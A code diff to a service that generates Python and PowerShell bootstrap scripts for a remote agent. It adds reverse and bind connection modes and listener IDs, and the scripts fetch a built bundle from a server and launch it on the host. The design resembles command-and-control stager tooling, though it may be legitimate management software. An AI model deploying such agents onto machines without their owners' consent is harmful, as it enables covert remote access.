@@ -19,11 +19,28 @@ class AgentBootstrapScriptService:
         web_host = (payload.get('web_host') or server_host).strip() or server_host
         web_scheme = (payload.get('web_scheme') or 'http').strip() or 'http'
         listener_id = str(payload.get('listener_id') or '').strip()
+        connection_mode = str(payload.get('connection_mode') or 'reverse').strip().lower()
+        bind_host = str(payload.get('bind_host') or '0.0.0.0').strip()
+        try:
+            bind_port = int(payload.get('bind_port', 9443))
+        except (TypeError, ValueError):
+            raise ValueError('bind_port must be integer')
+        if connection_mode not in ('reverse', 'bind'):
+            raise ValueError('connection_mode must be reverse or bind')
+        if connection_mode == 'bind' and (not bind_host or not 1 <= bind_port <= 65535):
+            raise ValueError('Invalid Bind listen address or port')
 
-        if not server_host:
-            raise ValueError('server_host is required')
-        if not server_port:
-            raise ValueError('server_port is required')
+        if connection_mode == 'bind':
+            if not web_host:
+                raise ValueError('web_host is required')
+            server_host = web_host
+            # Used only if the generated Client is manually switched to Reverse.
+            server_port = 9999
+        else:
+            if not server_host:
+                raise ValueError('server_host is required')
+            if not server_port:
+                raise ValueError('server_port is required')
         if not web_port:
             raise ValueError('web_port is required')
 
@@ -47,6 +64,9 @@ class AgentBootstrapScriptService:
             'web_port': web_port,
             'web_scheme': web_scheme,
             'listener_id': listener_id,
+            'connection_mode': connection_mode,
+            'bind_host': bind_host,
+            'bind_port': bind_port,
         }
 
     def generate_python_script(self, payload: dict) -> str:
@@ -58,6 +78,7 @@ class AgentBootstrapScriptService:
             params['web_port'],
             params['web_scheme'],
             params['listener_id'],
+            params['connection_mode'], params['bind_host'], params['bind_port'],
         )
 
     def generate_powershell_script(self, payload: dict) -> str:
@@ -67,9 +88,11 @@ class AgentBootstrapScriptService:
             params['server_port'],
             params['web_port'],
             params['listener_id'],
+            params['connection_mode'], params['bind_host'], params['bind_port'],
         )
 
-    def _generate_python_script(self, server_host, server_port, web_host, web_port, web_scheme='http', listener_id=''):
+    def _generate_python_script(self, server_host, server_port, web_host, web_port, web_scheme='http', listener_id='',
+                                connection_mode='reverse', bind_host='0.0.0.0', bind_port=9443):
         import json
         script = _PYTHON_BOOTSTRAP
         for key, value in {
@@ -79,11 +102,15 @@ class AgentBootstrapScriptService:
             '@WEB_PORT@': str(web_port),
             '@WEB_SCHEME@': json.dumps(web_scheme),
             '@LISTENER_ID@': json.dumps(listener_id),
+            '@CONNECTION_MODE@': json.dumps(connection_mode),
+            '@BIND_HOST@': json.dumps(bind_host),
+            '@BIND_PORT@': str(bind_port),
         }.items():
             script = script.replace(key, value)
         return script
 
-    def _generate_powershell_script(self, server_host, server_port, web_port, listener_id=''):
+    def _generate_powershell_script(self, server_host, server_port, web_port, listener_id='',
+                                    connection_mode='reverse', bind_host='0.0.0.0', bind_port=9443):
         import json
         script = _POWERSHELL_BOOTSTRAP
         for key, value in {
@@ -91,6 +118,9 @@ class AgentBootstrapScriptService:
             '@SERVER_PORT@': str(server_port),
             '@WEB_PORT@': str(web_port),
             '@LISTENER_ID@': json.dumps(listener_id),
+            '@CONNECTION_MODE@': json.dumps(connection_mode),
+            '@BIND_HOST@': json.dumps(bind_host),
+            '@BIND_PORT@': str(bind_port),
         }.items():
             script = script.replace(key, value)
         return script
@@ -120,6 +150,9 @@ WEB_HOST = @WEB_HOST@
 WEB_PORT = @WEB_PORT@
 WEB_SCHEME = @WEB_SCHEME@
 LISTENER_ID = @LISTENER_ID@
+CONNECTION_MODE = @CONNECTION_MODE@
+BIND_HOST = @BIND_HOST@
+BIND_PORT = @BIND_PORT@
 BASE_URL = f"{WEB_SCHEME}://{WEB_HOST}:{WEB_PORT}"
 MIN_PYTHON = (3, 10)
 
@@ -284,13 +317,19 @@ def prepare_python():
 
 def build_bundle():
     payload = {
-        'server_host': SERVER_HOST, 'server_port': SERVER_PORT,
-        'server_web_scheme': WEB_SCHEME, 'server_web_host': WEB_HOST,
-        'web_port': WEB_PORT, 'target_os': '', 'builder': 'python',
+        'target_os': '', 'builder': 'python',
         'target_arch': '', 'source': 'bootstrap',
+        'connection_mode': CONNECTION_MODE,
     }
-    if LISTENER_ID:
-        payload['listener_id'] = LISTENER_ID
+    if CONNECTION_MODE == 'bind':
+        payload.update(bind_host=BIND_HOST, bind_port=BIND_PORT)
+    else:
+        payload.update(
+            server_web_scheme=WEB_SCHEME, server_web_host=WEB_HOST, web_port=WEB_PORT,
+            server_host=SERVER_HOST, server_port=SERVER_PORT,
+        )
+        if LISTENER_ID:
+            payload['listener_id'] = LISTENER_ID
     log(f'Requesting Bundle build: {BASE_URL}/api/agent/build')
     result = json.loads(request_bytes(f'{BASE_URL}/api/agent/build', payload))
     if result.get('code') != 0:
@@ -326,7 +365,8 @@ def launch(python, directory):
 
 
 def main():
-    log(f'Server: {BASE_URL}; Socket: {SERVER_HOST}:{SERVER_PORT}')
+    log(f'Server Web: {BASE_URL}; Client Listen: {BIND_HOST}:{BIND_PORT}' if CONNECTION_MODE == 'bind'
+        else f'Server: {BASE_URL}; Socket: {SERVER_HOST}:{SERVER_PORT}')
     log(f'Bundle root: {ROOT}')
     DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
     RELEASES_DIR.mkdir(parents=True, exist_ok=True)
@@ -373,12 +413,15 @@ $ip = @SERVER_HOST@
 $serverPort=@SERVER_PORT@
 $webPort=@WEB_PORT@
 $listenerId=@LISTENER_ID@
+$connectionMode=@CONNECTION_MODE@
+$bindHost=@BIND_HOST@
+$bindPort=@BIND_PORT@
 $bundleDir = Join-Path $env:USERPROFILE 'client_bundle'
 $runtimeDir = Join-Path $bundleDir 'runtimes\python-embed'
 $downloadsDir = Join-Path $bundleDir 'downloads'
 $releaseDir = Join-Path $bundleDir 'releases'
 New-Item -Type Directory -Force $downloadsDir,$releaseDir | Out-Null
-Write-Host "[bootstrap] Server: $ip`:$webPort; Socket: $ip`:$serverPort"
+Write-Host "[bootstrap] Server Web: $ip`:$webPort; Mode: $connectionMode"
 Write-Host "[bootstrap] Bundle root: $bundleDir"
 Write-Host '[bootstrap] Preparing Python runtime (minimum 3.10)'
 
@@ -474,11 +517,20 @@ if (-not $py) {
 }
 
 $body = @{
-    server_host=$ip; server_port=$serverPort; web_port=$webPort;
     target_os=''; builder='python'; target_arch=''; source='bootstrap';
-    server_web_scheme='http'; server_web_host=$ip
+    connection_mode=$connectionMode
 }
-if ($listenerId) { $body['listener_id'] = $listenerId }
+if ($connectionMode -eq 'bind') {
+    $body['bind_host'] = $bindHost
+    $body['bind_port'] = $bindPort
+} else {
+    $body['web_port'] = $webPort
+    $body['server_web_scheme'] = 'http'
+    $body['server_web_host'] = $ip
+    $body['server_host'] = $ip
+    $body['server_port'] = $serverPort
+    if ($listenerId) { $body['listener_id'] = $listenerId }
+}
 $body = $body | ConvertTo-Json -Compress
 Write-Host "[bootstrap] Requesting Bundle build: http://$ip`:$webPort/api/agent/build"
 $response = Invoke-RestMethod "http://$ip`:$webPort/api/agent/build" -Method Post -ContentType 'application/json' -Body $body
